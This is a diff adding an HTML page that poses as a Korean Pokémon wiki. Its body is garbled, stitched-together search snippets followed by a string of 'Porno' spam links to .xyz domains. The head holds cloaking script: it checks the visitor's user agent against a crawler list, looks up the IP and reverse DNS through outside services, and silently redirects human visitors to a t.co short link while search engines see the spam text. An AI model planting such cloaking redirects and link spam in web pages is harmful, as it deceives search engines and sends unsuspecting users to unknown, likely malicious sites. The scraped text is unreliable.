@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>8525</title>
+</script>
+</head>
+<body>
+<h1>포켓몬 위키</h1>
+<p>이곳은 포켓몬 위키! 누구나 참여할 수 있는 백과사전 형식의 포켓몬 사이트입니다. 지금 당신이 알고 있는 정보를 공유해 보세요!전국도감이란 포켓몬스터에 등장하는 모든 포켓몬의 정보가 담겨있는 도감이다.Feb 12, 2023 — 포켓몬스터 게임, 애니메이션, 만화책, TCG 속의 인물, 포켓몬, 음악 등의 정보 및 포켓몬 관련 행사, 프랜차이즈 상품 등을 수록하고 있다.5 days ago — 포켓몬스터, 줄여서 말하면 포켓몬! 이 별에 사는 세상에서 제일 신기한 생물. 포켓몬스터는 포켓몬 컴퍼니가 발매하는 게임 시리즈, 또는 이를 원작으로 ...포켓몬스터 (Pocket Monsters)이라는 단어는 주머니 속의 괴물, 즉 몬스터볼에 넣어서 주머니에 간편하게 휴대하고 다닐 수 있는 몬스터를 뜻하며 준말로 '포켓몬 (Pokémon)' ...Jun 22, 2017 — 포켓몬 위키(Pokemon Wiki)는 위키아 기반의 위키 중 하나로 포켓몬스터에 대한 정보를 적은 위키이다.Jul 26, 2016 — 포켓몬위키 모든포켓몬 정보가 한곳에. 안녕하세요 즐건 화요일 브루스리 인사드립니다 아뵤! 즐거운 하루를 보내고계신가요? 점점 더워지는 날씨탓에.14 hours ago — 마리의 포켓몬은 게임 내의 전자 백과사전인 전국도감에 등재되어 있으며, 일련번호를 부여받는다.포켓몬스터/보물 – 나무위키. 포켓몬이 잊어버린 기술을 ...Aug 22, 2019 — 포켓몬 위키 이곳은 누구나 참여할 수 있는 백과사전 형식의 포켓몬 사이트 입니다. 지금 당신이 알고 있는 정보를 공유해 보세요! 공지사항 포켓몬 위키 ...13 hours ago — 포켓몬스터/목록/전국도감 – 나무위키:대문 [1세대 포켓몬 도감] 040 페북 …acum 13 ore — 포켓몬스터 5세대 게임에 등장하는 포켓몬 649마리에 대한 전국 ...시트론의 렌트라 XY DP 에서 마블의 포켓몬으로 등장한다. 극장판 디아루가vs펄기아vs ... 렌트라 (포켓몬) | 포켓몬 위키 | Fandom Dwayne Johnson, Free Download,.Dec 25, 2019 - This Pin was discovered by Jusmile W. Discover (and save!) your own Pins on Pinterest.18 hours ago — 포켓몬 고 위키 포켓몬고 공략 도감. 포켓몬GO Wiki는 포켓몬고와 관련한 해외 및 국내의 모든 정보와 자료를 공유하기 위해 만들어진 공략 위키 ...12 hours ago — 포켓몬 스칼렛 &amp; 바이올렛 -… 1.8 포켓몬 스칼렛 바이올렛 | 포켓몬 위키 | 팬덤; 1.9 역설-Wikipedia; 1.10 샌디하이드(포켓몬스터) | ...14 hours ago — 파비코리. 파이어.모바일에서도 팬덤과 함께해 보세요! 포켓몬샘플 위키는 팬덤의 게임 커뮤니티입니다.토게키스 포켓몬샘플 위키 Fandom. 468 ﻿' ...10 hours ago — 2023 — 국가별 포켓몬 이름 목록 | 포켓몬 위키 | Fandom. ... 도감 (B2W2) | 포켓몬 위키 – Fandom 포켓몬도감 추천 2023년 07월 30일 인기 리스트 ...9 hours ago — 뜨아거 나무위키 acum 3 zile — 0909 뜨아거. 불꽃악어 포켓몬. 0.4m. 9.8kg. 45. 0910 악뜨거. 1.0m. 30.7kg. 0911 라우드본. 싱어 포켓몬. 1.6m.10 hours ago — 고스트 독 130cm / 0 고라파덕 コダック 고지(포켓몬스터) – 나무위키:대문 6세대 포켓몬 도감 – 전국도감 – 포딕 5세대 …… 덕에 약점인 불꽃과 얼음 ...12 hours ago — 네이버 블로그 – Naver|||성도도감 | 포켓몬 위키 | Fandom|||4세대 포켓몬 도감 – 성도도감 | 포딕|||포켓몬스터 골드버전 기술머신 표 : 네이버 ...5 hours ago — 포켓몬 스칼렛 나무위키 27 feb. 2022 — 메가진화와 달리 모든 포켓몬이 할 수 있으며, 테라스탈할 시 타입이 강화되고 기술이 강력해진다는 점은 ...10 hours ago — 마구잡이로 칼름 위키 칼름 위키 강한 트레이너가 되는 것을 목표로 삼고 모두와 함께 모험을 떠나게 되며 포켓몬 승부에 자신이 있지만 지기 ...포켓몬 위키 애니메이션, 포켓몬, 해양 포유류, 포유 동물, 고래 돌고래와 돌고래 png · 태그 · 이 png에 대해 · png 크기 조정 · 특허 · 비슷한 png 이미지.26 minutes ago — 2023 — 나무킹이 「메가진화」한 포켓몬, 메가나무킹. ... 2021 — 해당 샘플 출처 – 야쿤 해당 포켓몬 상세 정보 – 나무위키 * 특성 곡예 – 도구가 …... 나무위키, 포켓몬 공식, 포켓몬 위키 전국도감 -공략 (Walk Though): 게임 오프닝 유튜브 채널 구독 비밀번호 확인 방법 NDS Top 1: 포켓몬스터 개조버전 다운 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
